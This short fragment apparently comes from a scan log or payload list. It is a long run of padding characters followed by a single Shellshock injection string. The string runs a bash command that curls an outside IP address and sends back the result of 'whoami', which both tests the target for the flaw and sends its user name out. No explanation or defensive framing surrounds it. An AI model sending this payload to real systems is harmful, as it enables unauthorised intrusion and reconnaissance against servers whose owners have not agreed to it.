XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
+"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"""
